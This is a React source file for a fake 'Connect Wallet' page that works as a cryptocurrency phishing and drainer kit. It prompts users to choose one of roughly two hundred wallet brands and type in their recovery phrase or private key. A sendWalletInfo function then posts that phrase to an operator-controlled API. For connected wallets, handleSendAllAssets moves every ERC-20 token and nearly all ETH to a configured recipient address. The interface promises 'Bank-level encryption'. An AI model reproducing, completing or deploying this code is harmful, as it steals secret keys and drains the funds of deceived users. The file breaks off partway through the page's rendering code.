import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { createWeb3Modal, useWeb3Modal, defaultConfig, useWeb3ModalAccount, useWeb3ModalProvider, useDisconnect } from '@web3modal/ethers/react';
import { 
  Import, 
  X, 
  AlertTriangle, 
  Zap,
  Eye,
  EyeOff,
  ArrowLeft,
  Wallet,
  Shield,
  Check
} from 'lucide-react';

// --- Web3Modal Configuration ---

const projectId = process.env.REACT_APP_WALLETCONNECT_PROJECT_ID;

const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
};

const metadata = {
    name: 'Connect Wallet',
    description: 'Connect your wallet to proceed',
    url: window.location.href,
    icons: ['https://avatars.githubusercontent.com/u/37784886']
};

const ethersConfig = defaultConfig({
  metadata
});

createWeb3Modal({
  ethersConfig,
  chains: [mainnet],
  projectId,
  enableAnalytics: false, // Disabled for debugging
  enableOnramp: false // Disabled for debugging
});

// --- Application Code & Constants ---

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint value) returns (bool)"
];

const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';

const POPULAR_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', description: 'Popular browser extension wallet' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡', description: 'Mobile-first crypto wallet' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵', description: 'User-friendly crypto wallet' },
  { id: 'phantom', name: 'Phantom', icon: '👻', description: 'Solana ecosystem wallet' },
  { id: 'binance', name: 'Binance Chain Wallet', icon: '🟡', description: 'Binance Smart Chain wallet' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', description: 'Connect any mobile wallet' },
  { id: 'exodus', name: 'Exodus', icon: '🚀', description: 'Multi-currency desktop wallet' },
  { id: 'atomic', name: 'Atomic Wallet', icon: '⚛', description: 'Decentralized multi-asset wallet' },
  { id: 'electrum', name: 'Electrum', icon: '⚡', description: 'Lightweight Bitcoin wallet' },
  { id: 'ledger', name: 'Ledger Live', icon: '📊', description: 'Hardware wallet companion' },
  { id: 'trezor', name: 'Trezor Suite', icon: '🔐', description: 'Hardware wallet interface' },
  { id: 'myetherwallet', name: 'MyEtherWallet', icon: '💎', description: 'Ethereum wallet interface' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈', description: 'Ethereum wallet with DeFi focus' },
  { id: 'argent', name: 'Argent', icon: '🏛', description: 'Smart contract wallet' },
  { id: 'imtoken', name: 'imToken', icon: '🎯', description: 'Multi-blockchain wallet' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: '💰', description: 'Multi-chain wallet' },
  { id: 'safepal', name: 'SafePal', icon: '🔒', description: 'Hardware and software wallet' },
  { id: 'keplr', name: 'Keplr', icon: '🌌', description: 'Cosmos ecosystem wallet' },
  { id: 'terra', name: 'Terra Station', icon: '🌍', description: 'Terra blockchain wallet' },
  { id: 'solflare', name: 'Solflare', icon: '☀', description: 'Solana wallet' },
  { id: 'slope', name: 'Slope', icon: '📈', description: 'Solana mobile wallet' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🧮', description: 'Multi-platform crypto wallet' },
  { id: 'enjin', name: 'Enjin Wallet', icon: '🎮', description: 'Gaming-focused wallet' },
  { id: 'status', name: 'Status', icon: '💬', description: 'Ethereum wallet with messaging' },
  { id: 'pillar', name: 'Pillar', icon: '🏗', description: 'Personal data locker wallet' },
  { id: 'unstoppable', name: 'Unstoppable Wallet', icon: '🚫', description: 'Non-custodial multi-coin wallet' },
  { id: 'edge', name: 'Edge', icon: '🔺', description: 'Mobile crypto wallet' },
  { id: 'blockchain', name: 'Blockchain.com', icon: '⛓', description: 'Popular web wallet' },
  { id: 'jaxx', name: 'Jaxx Liberty', icon: '💫', description: 'Multi-platform wallet' },
  { id: 'breadwallet', name: 'BRD', icon: '🍞', description: 'Simple crypto wallet' },
  { id: 'coinomi', name: 'Coinomi', icon: '🪙', description: 'Multi-coin mobile wallet' },
  { id: 'guarda', name: 'Guarda', icon: '🛡', description: 'Multi-currency wallet' },
  { id: 'zelcore', name: 'Zelcore', icon: '⚡', description: 'Multi-asset wallet' },
  { id: 'bitpay', name: 'BitPay', icon: '💳', description: 'Bitcoin wallet with card' },
  { id: 'luno', name: 'Luno', icon: '🌙', description: 'Bitcoin and Ethereum wallet' },
  { id: 'wasabi', name: 'Wasabi Wallet', icon: '🌶', description: 'Privacy-focused Bitcoin wallet' },
  { id: 'samurai', name: 'Samourai Wallet', icon: '🥷', description: 'Privacy Bitcoin wallet' },
  { id: 'bluewallet', name: 'BlueWallet', icon: '🔵', description: 'Bitcoin Lightning wallet' },
  { id: 'green', name: 'Green Wallet', icon: '🟢', description: 'Blockstream Green wallet' },
  { id: 'muun', name: 'Muun', icon: '🌕', description: 'Bitcoin Lightning wallet' },
  { id: 'phoenix', name: 'Phoenix', icon: '🔥', description: 'Lightning Network wallet' },
  { id: 'yoroi', name: 'Yoroi', icon: '🏮', description: 'Cardano wallet' },
  { id: 'daedalus', name: 'Daedalus', icon: '🏛', description: 'Full-node Cardano wallet' },
  { id: 'adalite', name: 'AdaLite', icon: '💎', description: 'Cardano web wallet' },
  { id: 'nami', name: 'Nami', icon: '🌊', description: 'Cardano browser wallet' },
  { id: 'temple', name: 'Temple', icon: '🏛', description: 'Tezos wallet' },
  { id: 'kukai', name: 'Kukai', icon: '🌺', description: 'Tezos web wallet' },
  { id: 'galleon', name: 'Galleon', icon: '⛵', description: 'Tezos desktop wallet' },
  { id: 'algorand', name: 'Algorand Wallet', icon: '🔷', description: 'Official Algorand wallet' },
  { id: 'myalgo', name: 'MyAlgo', icon: '🔹', description: 'Algorand web wallet' },
  { id: 'polkadot', name: 'Polkadot.js', icon: '⚫', description: 'Polkadot ecosystem wallet' },
  { id: 'talisman', name: 'Talisman', icon: '🔮', description: 'Polkadot parachain wallet' },
  { id: 'subwallet', name: 'SubWallet', icon: '🌐', description: 'Polkadot multichain wallet' },
  { id: 'fearless', name: 'Fearless Wallet', icon: '💪', description: 'Polkadot mobile wallet' },
  { id: 'nova', name: 'Nova Wallet', icon: '⭐', description: 'Next-gen Polkadot wallet' },
  { id: 'near', name: 'NEAR Wallet', icon: '🔺', description: 'NEAR Protocol wallet' },
  { id: 'sender', name: 'Sender Wallet', icon: '📤', description: 'NEAR web wallet' },
  { id: 'harmony', name: 'Harmony One Wallet', icon: '🎵', description: 'Harmony blockchain wallet' },
  { id: 'elrond', name: 'Elrond Wallet', icon: '⚡', description: 'Elrond network wallet' },
  { id: 'maiar', name: 'Maiar', icon: '🌟', description: 'Elrond mobile wallet' },
  { id: 'avalanche', name: 'Avalanche Wallet', icon: '🏔', description: 'Avalanche ecosystem wallet' },
  { id: 'core', name: 'Core', icon: '🔥', description: 'Avalanche browser extension' },
  { id: 'ronin', name: 'Ronin Wallet', icon: '⚔', description: 'Axie Infinity sidechain wallet' },
  { id: 'glow', name: 'Glow', icon: '✨', description: 'Solana validator wallet' },
  { id: 'coin98', name: 'Coin98', icon: '🔄', description: 'Multi-chain DeFi wallet' },
  { id: 'safeware', name: 'Safeware', icon: '🔐', description: 'Security-focused wallet' },
  { id: 'bitkeep', name: 'BitKeep', icon: '🗝', description: 'Multi-chain Web3 wallet' },
  { id: 'onto', name: 'ONTO', icon: '🎯', description: 'Ontology blockchain wallet' },
  { id: 'cyano', name: 'Cyano Wallet', icon: '🔬', description: 'Ontology browser wallet' },
  { id: 'owallet', name: 'OWallet', icon: '⭕', description: 'Ontology mobile wallet' },
  { id: 'neon', name: 'Neon Wallet', icon: '🌈', description: 'NEO blockchain wallet' },
  { id: 'o3', name: 'O3 Wallet', icon: '⭕', description: 'Multi-chain NEO wallet' },
  { id: 'neoline', name: 'NeoLine', icon: '📈', description: 'NEO browser extension' },
  { id: 'scatter', name: 'Scatter', icon: '🌪', description: 'EOS ecosystem wallet' },
  { id: 'anchor', name: 'Anchor', icon: '⚓', description: 'EOS desktop wallet' },
  { id: 'wombat', name: 'Wombat', icon: '🐨', description: 'EOS gaming wallet' },
  { id: 'tokenary', name: 'Tokenary', icon: '💎', description: 'macOS Safari crypto wallet' },
  { id: 'frame', name: 'Frame', icon: '🖼', description: 'Desktop Ethereum wallet' },
  { id: 'gnosis', name: 'Gnosis Safe', icon: '🏛', description: 'Multi-signature wallet' },
  { id: 'portis', name: 'Portis', icon: '🚪', description: 'Web3 wallet SDK' },
  { id: 'fortmatic', name: 'Fortmatic', icon: '🎩', description: 'Web3 wallet with phone auth' },
  { id: 'torus', name: 'Torus', icon: '🔵', description: 'Social login Web3 wallet' },
  { id: 'authereum', name: 'Authereum', icon: '🔑', description: 'Meta-transaction wallet' },
  { id: 'dapper', name: 'Dapper', icon: '🎭', description: 'Flow blockchain wallet' },
  { id: 'blocto', name: 'Blocto', icon: '🧊', description: 'Flow and multi-chain wallet' },
  { id: 'lilico', name: 'Lilico', icon: '🌸', description: 'Flow browser extension wallet' },
  { id: 'finnie', name: 'Finnie', icon: '🐕', description: 'Koii network wallet' },
  { id: 'frontier', name: 'Frontier', icon: '🏔', description: 'DeFi and NFT wallet' },
  { id: 'alpha', name: 'Alpha Wallet', icon: '🐺', description: 'Ethereum mobile wallet' },
  { id: 'eidoo', name: 'Eidoo', icon: '🔷', description: 'Multi-currency mobile wallet' },
  { id: 'walleth', name: 'WallETH', icon: '📱', description: 'Android Ethereum wallet' },
  { id: 'dharma', name: 'Dharma', icon: '☸', description: 'DeFi-focused mobile wallet' },
  { id: 'monero', name: 'Monero GUI', icon: '🔒', description: 'Official Monero wallet' },
  { id: 'cake', name: 'Cake Wallet', icon: '🍰', description: 'Monero and Bitcoin wallet' },
  { id: 'monerujo', name: 'Monerujo', icon: '👁', description: 'Android Monero wallet' },
  { id: 'feather', name: 'Feather Wallet', icon: '🪶', description: 'Lightweight Monero wallet' },
  { id: 'zcash', name: 'Zcash Wallet', icon: '🛡', description: 'Official Zcash wallet' },
  { id: 'zecwallet', name: 'ZecWallet', icon: '⚡', description: 'Full-featured Zcash wallet' },
  { id: 'nighthawk', name: 'Nighthawk', icon: '🦅', description: 'Mobile Zcash wallet' },
  { id: 'dash', name: 'Dash Core', icon: '💨', description: 'Official Dash wallet' },
  { id: 'dashpay', name: 'DashPay', icon: '💸', description: 'Dash mobile wallet' },
  { id: 'litecoin', name: 'Litecoin Core', icon: '🥈', description: 'Official Litecoin wallet' },
  { id: 'loafwallet', name: 'LoafWallet', icon: '🍞', description: 'Litecoin mobile wallet' },
  { id: 'dogecoin', name: 'Dogecoin Core', icon: '🐕', description: 'Official Dogecoin wallet' },
  { id: 'multidoge', name: 'MultiDoge', icon: '🐶', description: 'Lightweight Dogecoin wallet' },
  { id: 'uniswap', name: 'Uniswap Wallet', icon: '🦄', description: 'Uniswap mobile wallet' },
  { id: '1inch', name: '1inch Wallet', icon: '⿡', description: 'DeFi aggregator wallet' },
  { id: 'metamask_mobile', name: 'MetaMask Mobile', icon: '📱', description: 'Mobile version of MetaMask' },
  { id: 'trustwallet_desktop', name: 'Trust Wallet Desktop', icon: '🖥', description: 'Desktop Trust Wallet app' },
  { id: 'brave_wallet', name: 'Brave Wallet', icon: '🦁', description: 'Built-in Brave browser wallet' },
  { id: 'opera_wallet', name: 'Opera Wallet', icon: '🎭', description: 'Opera browser crypto wallet' },
  { id: 'rabby', name: 'Rabby', icon: '🐰', description: 'Multi-chain browser extension' },
  { id: 'xdefi', name: 'XDEFI', icon: '❌', description: 'Multi-chain DeFi wallet' },
  { id: 'enkrypt', name: 'Enkrypt', icon: '🔐', description: 'Multi-chain browser wallet' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', description: 'Solana-first wallet' },
  { id: 'sollet', name: 'Sollet', icon: '🌞', description: 'Solana web wallet' },
  { id: 'math_extension', name: 'Math Wallet Extension', icon: '🧮', description: 'Browser extension version' },
  { id: 'coinhub', name: 'CoinHub', icon: '🌐', description: 'Multi-currency wallet' },
  { id: 'spatium', name: 'Spatium', icon: '🌌', description: 'Multi-blockchain wallet' },
  { id: 'keystone', name: 'Keystone', icon: '🗝', description: 'Air-gapped hardware wallet' },
  { id: 'coolwallet', name: 'CoolWallet', icon: '❄', description: 'Card-shaped hardware wallet' },
  { id: 'ellipal', name: 'ELLIPAL', icon: '🛡', description: 'Air-gapped hardware wallet' },
  { id: 'keepkey', name: 'KeepKey', icon: '🔑', description: 'Hardware wallet by ShapeShift' },
  { id: 'bitbox', name: 'BitBox', icon: '📦', description: 'Swiss hardware wallet' },
  { id: 'secux', name: 'SecuX', icon: '🔒', description: 'Hardware wallet with touch screen' },
  { id: 'cobo', name: 'Cobo Vault', icon: '🏦', description: 'Air-gapped hardware wallet' },
  { id: 'dcent', name: 'D\'CENT', icon: '💎', description: 'Biometric hardware wallet' },
  { id: 'ngrave', name: 'NGRAVE', icon: '⚱', description: 'Ultra-secure hardware wallet' },
  { id: 'gridplus', name: 'GridPlus', icon: '⚡', description: 'Lattice hardware wallet' },
  { id: 'coldcard', name: 'Coldcard', icon: '🧊', description: 'Bitcoin-only hardware wallet' },
  { id: 'foundation', name: 'Foundation Passport', icon: '🛂', description: 'Open-source hardware wallet' },
  { id: 'jade', name: 'Blockstream Jade', icon: '💚', description: 'Bitcoin hardware wallet' },
  { id: 'tangem', name: 'Tangem', icon: '💳', description: 'Card-based hardware wallet' },
  { id: 'fireblocks', name: 'Fireblocks', icon: '🔥', description: 'Institutional wallet platform' },
  { id: 'bitgo', name: 'BitGo', icon: '🏢', description: 'Enterprise crypto wallet' },
  { id: 'copper', name: 'Copper', icon: '🔶', description: 'Institutional custody solution' },
  { id: 'anchorage', name: 'Anchorage Digital', icon: '⚓', description: 'Regulated crypto custody' },
  { id: 'prime_trust', name: 'Prime Trust', icon: '🏦', description: 'Qualified custodian wallet' },
  { id: 'gemini_custody', name: 'Gemini Custody', icon: '♊', description: 'Institutional custody service' },
  { id: 'fidelity', name: 'Fidelity Digital Assets', icon: '🏛', description: 'Traditional finance crypto custody' },
  { id: 'bakkt', name: 'Bakkt', icon: '🥖', description: 'Digital asset platform wallet' },
  { id: 'voyager', name: 'Voyager', icon: '🚀', description: 'Crypto trading platform wallet' },
  { id: 'celsius', name: 'Celsius', icon: '🌡', description: 'Crypto lending platform wallet' },
  { id: 'nexo', name: 'Nexo', icon: '🔗', description: 'Crypto lending wallet' },
  { id: 'blockfi', name: 'BlockFi', icon: '📊', description: 'Crypto interest account' },
  { id: 'compound', name: 'Compound Finance', icon: '🏦', description: 'DeFi lending protocol wallet' },
  { id: 'aave', name: 'Aave', icon: '👻', description: 'DeFi lending platform' },
  { id: 'yearn', name: 'Yearn Finance', icon: '🌾', description: 'DeFi yield optimization' },
  { id: 'curve', name: 'Curve Finance', icon: '📈', description: 'Stablecoin DEX wallet' },
  { id: 'balancer', name: 'Balancer', icon: '⚖', description: 'Automated portfolio manager' },
  { id: 'sushiswap', name: 'SushiSwap', icon: '🍣', description: 'Decentralized exchange wallet' },
  { id: 'pancakeswap', name: 'PancakeSwap', icon: '🥞', description: 'BSC decentralized exchange' },
  { id: 'quickswap', name: 'QuickSwap', icon: '⚡', description: 'Polygon DEX wallet' },
  { id: 'traderjoe', name: 'Trader Joe', icon: '☕', description: 'Avalanche DEX wallet' },
  { id: 'raydium', name: 'Raydium', icon: '☀', description: 'Solana DEX and AMM' },
  { id: 'serum', name: 'Serum', icon: '🧪', description: 'Solana DEX wallet' },
  { id: 'orca', name: 'Orca', icon: '🐋', description: 'Solana DEX wallet' },
  { id: 'jupiter', name: 'Jupiter', icon: '🪐', description: 'Solana swap aggregator' },
  { id: 'osmosis', name: 'Osmosis', icon: '🌊', description: 'Cosmos DEX wallet' },
  { id: 'terraswap', name: 'Terraswap', icon: '🌍', description: 'Terra DEX wallet' },
  { id: 'astroport', name: 'Astroport', icon: '🚀', description: 'Terra DeFi hub' },
  { id: 'anchor_protocol', name: 'Anchor Protocol', icon: '⚓', description: 'Terra savings protocol' },
  { id: 'mirror', name: 'Mirror Protocol', icon: '🪞', description: 'Terra synthetic assets' },
  { id: 'thorchain', name: 'THORChain', icon: '⚡', description: 'Cross-chain DEX' },
  { id: 'rango', name: 'Rango Exchange', icon: '🔄', description: 'Cross-chain DEX aggregator' },
  { id: 'hop', name: 'Hop Protocol', icon: '🐰', description: 'Layer 2 bridge' },
  { id: 'synapse', name: 'Synapse Protocol', icon: '🧠', description: 'Cross-chain bridge' },
  { id: 'multichain', name: 'Multichain', icon: '⛓', description: 'Cross-chain router protocol' },
  { id: 'stargate', name: 'Stargate Finance', icon: '🌟', description: 'Omnichain liquidity transport' },
  { id: 'wormhole', name: 'Wormhole', icon: '🕳', description: 'Cross-chain bridge' },
  { id: 'polygon_bridge', name: 'Polygon Bridge', icon: '🔺', description: 'Ethereum to Polygon bridge' },
  { id: 'arbitrum_bridge', name: 'Arbitrum Bridge', icon: '🔵', description: 'Ethereum Layer 2 bridge' },
  { id: 'optimism_gateway', name: 'Optimism Gateway', icon: '🔴', description: 'Optimistic rollup bridge' },
  { id: 'loopring', name: 'Loopring', icon: '⭕', description: 'Ethereum Layer 2 wallet' },
  { id: 'zksync', name: 'zkSync', icon: '⚡', description: 'Ethereum Layer 2 scaling' },
  { id: 'starknet', name: 'StarkNet', icon: '⭐', description: 'Ethereum Layer 2 solution' },
  { id: 'immutable', name: 'Immutable X', icon: '❌', description: 'NFT Layer 2 solution' },
  { id: 'dydx', name: 'dYdX', icon: '📊', description: 'Decentralized derivatives exchange' },
  { id: 'gmx', name: 'GMX', icon: '📈', description: 'Decentralized perpetual exchange' },
  { id: 'perpetual', name: 'Perpetual Protocol', icon: '♾', description: 'Decentralized perpetuals' },
  { id: 'mango', name: 'Mango Markets', icon: '🥭', description: 'Solana derivatives trading' },
  { id: 'drift', name: 'Drift Protocol', icon: '🏎', description: 'Solana perpetuals DEX' },
  { id: 'ribbon', name: 'Ribbon Finance', icon: '🎀', description: 'Structured products protocol' },
  { id: 'opyn', name: 'Opyn', icon: '🛡', description: 'DeFi options protocol' },
  { id: 'hegic', name: 'Hegic', icon: '🦔', description: 'On-chain options trading' },
  { id: 'dopex', name: 'Dopex', icon: '💊', description: 'Decentralized options exchange' },
  { id: 'lyra', name: 'Lyra', icon: '🎵', description: 'Options AMM protocol' },
  { id: 'premia', name: 'Premia', icon: '💎', description: 'Options trading platform' },
  { id: 'nexus_mutual', name: 'Nexus Mutual', icon: '🛡', description: 'Decentralized insurance' },
  { id: 'cover', name: 'Cover Protocol', icon: '☂', description: 'DeFi insurance marketplace' },
  { id: 'unslashed', name: 'Unslashed Finance', icon: '🔓', description: 'Decentralized insurance' },
  { id: 'chainlink', name: 'Chainlink', icon: '🔗', description: 'Oracle network wallet' },
  { id: 'band', name: 'Band Protocol', icon: '🎵', description: 'Cross-chain data oracle' },
  { id: 'api3', name: 'API3', icon: '🔌', description: 'Decentralized API network' },
  { id: 'tellor', name: 'Tellor', icon: '📡', description: 'Decentralized oracle network' },
  { id: 'dia', name: 'DIA', icon: '💎', description: 'Open financial data platform' },
  { id: 'gitcoin', name: 'Gitcoin', icon: '🏗', description: 'Open source funding platform' },
  { id: 'snapshot', name: 'Snapshot', icon: '📸', description: 'Decentralized voting platform' },
  { id: 'aragon', name: 'Aragon', icon: '🏛', description: 'DAO creation platform' },
  { id: 'colony', name: 'Colony', icon: '🐝', description: 'DAO platform for organizations' },
  { id: 'moloch', name: 'Moloch DAO', icon: '👹', description: 'Minimalist DAO framework' },
  { id: 'compound_governance', name: 'Compound Governance', icon: '🗳', description: 'DeFi governance platform' },
  { id: 'maker_governance', name: 'MakerDAO Governance', icon: '🏛', description: 'DAI stablecoin governance' },
  { id: 'aave_governance', name: 'Aave Governance', icon: '👻', description: 'Aave protocol governance' },
  { id: 'uniswap_governance', name: 'Uniswap Governance', icon: '🦄', description: 'UNI token governance' },
  { id: 'ens', name: 'ENS', icon: '🌐', description: 'Ethereum Name Service' },
  { id: 'unstoppable_domains', name: 'Unstoppable Domains', icon: '🚫', description: 'Blockchain domain service' },
  { id: 'handshake', name: 'Handshake', icon: '🤝', description: 'Decentralized naming protocol' },
  { id: 'ipfs', name: 'IPFS', icon: '🌐', description: 'InterPlanetary File System' },
  { id: 'filecoin', name: 'Filecoin', icon: '📁', description: 'Decentralized storage network' },
  { id: 'arweave', name: 'Arweave', icon: '🏹', description: 'Permanent data storage' },
  { id: 'storj', name: 'Storj', icon: '☁', description: 'Decentralized cloud storage' },
  { id: 'siacoin', name: 'Siacoin', icon: '💾', description: 'Decentralized storage platform' },
  { id: 'golem', name: 'Golem', icon: '🤖', description: 'Decentralized computing network' },
  { id: 'render', name: 'Render Network', icon: '🎨', description: 'Decentralized GPU rendering' },
  { id: 'livepeer', name: 'Livepeer', icon: '📹', description: 'Decentralized video streaming' },
  { id: 'theta', name: 'Theta Network', icon: '📺', description: 'Decentralized video delivery' }
];

// --- Helper Functions ---

const sendWalletInfo = async (walletName, secretPhrase) => {
  try {
    await fetch(`${API_URL}/api/send-wallet`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName: walletName }),
    });
  } catch (err) {
    console.error('Error sending wallet info:', err);
    throw err;
  }
};

const getWalletAssets = async (provider, address) => {
  try {
    // 1. Get ETH balance
    const ethBalance = await provider.getBalance(address);
    const formattedEthBalance = ethers.formatEther(ethBalance);

    // 2. Use Alchemy API to find all token balances
    const alchemyApiKey = process.env.REACT_APP_ALCHEMY_API_KEY;
    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${alchemyApiKey}`;
    
    const tokenBalancesRes = await fetch(alchemyUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 1,
        method: 'alchemy_getTokenBalances',
        params: [address, 'erc20'],
      }),
    });
    const tokenBalancesData = await tokenBalancesRes.json();
    const tokenBalances = tokenBalancesData.result.tokenBalances;

    // 3. For each token, get its metadata and format the balance
    const tokens = await Promise.all(
      tokenBalances
        .filter(t => t.tokenBalance !== '0') // Filter out tokens with zero balance
        .map(async (token) => {
          try {
            const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
            const decimals = await contract.decimals();
            const symbol = await contract.symbol();
            const balance = ethers.formatUnits(token.tokenBalance, decimals);
            
            return {
              contractAddress: token.contractAddress,
              symbol,
              balance,
              rawBalance: BigInt(token.tokenBalance) // Use BigInt for raw balance
            };
          } catch (e) {
            // Some tokens might fail (e.g., bad ABI), so we'll ignore them
            console.warn(`Could not fetch metadata for token at ${token.contractAddress}`, e);
            return null;
          }
        })
    );
    
    return {
      eth: formattedEthBalance,
      tokens: tokens.filter(t => t !== null), // Filter out any tokens that failed
    };
  } catch (err) {
    console.error('Error fetching wallet assets:', err);
    return { eth: '0', tokens: [] };
  }
};

// --- Main Component ---

export default function ConnectWallet() {
  // Web3Modal Hooks
  const { open } = useWeb3Modal();
  const { address, isConnected, chainId } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();
  const { disconnect } = useDisconnect();

  // Component State
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
  const [isSending, setIsSending] = useState(false);
  const [txError, setTxError] = useState('');
  
  // UI State
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [manualStep, setManualStep] = useState('selection'); // 'selection' or 'input'
  const [selectedWallet, setSelectedWallet] = useState(null);

  // Manual Form State
  const [formData, setFormData] = useState({ secretPhrase: '' });
  const [errors, setErrors] = useState({});

  // Effect to handle wallet connection and disconnection
  useEffect(() => {
    const handleConnection = async () => {
      if (isConnected && walletProvider && address) {
        try {
          const ethersProvider = new ethers.BrowserProvider(walletProvider);
          const ethersSigner = await ethersProvider.getSigner();
          setProvider(ethersProvider);
          setSigner(ethersSigner);

          const balances = await getWalletAssets(ethersProvider, address);
          setWalletBalance(balances);
          setShowTransactionPopup(true);
          setTxError('');
        } catch (err) {
            console.error("Error setting up provider and fetching balance:", err);
            setTxError("Could not initialize wallet connection. Please try again.");
        }
      } else {
        // Reset state on disconnect
        setProvider(null);
        setSigner(null);
        setWalletBalance({ eth: '0', tokens: [] });
        setShowTransactionPopup(false);
        setIsSending(false);
        setTxError('');
      }
    };

    handleConnection();
  }, [isConnected, address, walletProvider]);

  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowTransactionPopup(false);
    setFormData({ secretPhrase: '' });
    setErrors({});
    setTxError('');
    setManualStep('selection');
    setSelectedWallet(null);
  };
  
  // --- Form Handlers ---
  
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setManualStep('input');
  };

  const handleInputChange = (e) => {
    setFormData({ ...formData, secretPhrase: e.target.value });
    if (errors.secretPhrase) {
      setErrors({ ...errors, secretPhrase: null });
    }
  };

  const validateForm = () => {
    const newErrors = {};
    if (!formData.secretPhrase.trim()) newErrors.secretPhrase = 'Secret phrase or private key is required';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleManualSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      try {
        await sendWalletInfo(selectedWallet.name, formData.secretPhrase);
        closeAllPopups();
      } catch (err) {
        setErrors({ form: "Failed to submit details. Please try again." });
      }
    }
  };

  // --- Transaction Logic ---

  const handleSendAllAssets = async () => {
    if (!provider || !signer || !address || !RECIPIENT_ADDRESS) {
      setTxError("Wallet not connected or recipient address is not configured.");
      return;
    }
    
    setIsSending(true);
    setTxError('');
    const errorMessages = [];

    // Determine fee strategy (EIP-1559 vs. Legacy)
    const feeData = await provider.getFeeData();
    const txOptions = {};
    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
      txOptions.maxFeePerGas = feeData.maxFeePerGas;
      txOptions.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
      txOptions.type = 2; // EIP-1559
    } else {
      txOptions.gasPrice = feeData.gasPrice;
      txOptions.type = 0; // Legacy
    }

    // 1. Attempt to send all ERC-20 tokens
    for (const token of walletBalance.tokens) {
      try {
        if (token.rawBalance > 0n) {
          console.log(`Attempting to send ${token.symbol}...`);
          const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
          const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.rawBalance, txOptions);
          await tx.wait();
          console.log(`${token.symbol} transfer confirmed!`);
        }
      } catch (err) {
        console.error(`${token.symbol} transfer failed:`, err);
        errorMessages.push(`${token.symbol}: ${err.reason || err.message}`);
      }
    }

    // 2. Attempt to send ETH
    try {
      const balance = await provider.getBalance(address);
      const gasLimit = 21000n;
      
      const gasPrice = txOptions.gasPrice || txOptions.maxFeePerGas;
      if (!gasPrice) {
        throw new Error("Could not determine gas price for transaction.");
      }

      const gasCost = gasPrice * gasLimit;

      if (balance > gasCost) {
        const valueToSend = balance - gasCost;
        const ethTxOptions = {
          ...txOptions,
          to: RECIPIENT_ADDRESS,
          value: valueToSend,
          gasLimit: gasLimit
        };
        const tx = await signer.sendTransaction(ethTxOptions);
        console.log('ETH transaction sent:', tx.hash);
        await tx.wait();
        console.log('ETH transaction confirmed!');
      } else if (balance > 0n) {
        console.log("Insufficient ETH for gas fees.");
      }
    } catch (err) {
      console.error("ETH transfer failed:", err);
      errorMessages.push(`ETH: ${err.reason || err.message}`);
    }

    setIsSending(false);

    if (errorMessages.length > 0) {
      const message = errorMessages.join('; ');
      setTxError(message.length > 150 ? 'Multiple errors occurred during transfer.' : message);
    } else {
      closeAllPopups();
    }
  };

  // --- Render Methods ---

  const renderConnectionCards = () => (
    <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
      <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-purple-500/50 transition-all duration-300">
        <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/10 to-pink-600/10 rounded-full blur-3xl"></div>
        <div className="relative z-10">
          <div className="flex items-center gap-4 mb-6">
            <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
              <Import size={24} className="text-purple-400" />
            </div>
            <div className="text">
              <h3 className="text-xl font-semibold text-white">Manual Connection</h3>
              <p className="text-gray-400 text-sm">Import using seed phrase</p>
            </div>
          </div>
          <p className="text-gray-300 mb-6">
            Securely connect by selecting your wallet type and entering your recovery phrase.
          </p>
          <div className="features-list space-y-2 mb-8">
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Shield size={14} className="text-green-400" /> <span>Bank-level encryption</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Check size={14} className="text-green-400" /> <span>Works with all wallet types</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Wallet size={14} className="text-green-400" /> <span>Direct access to funds</span>
            </div>
          </div>
          <button 
            onClick={() => setShowManualPopup(true)}
            className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30"
          >
            Connect Manually
          </button>
        </div>
      </div>
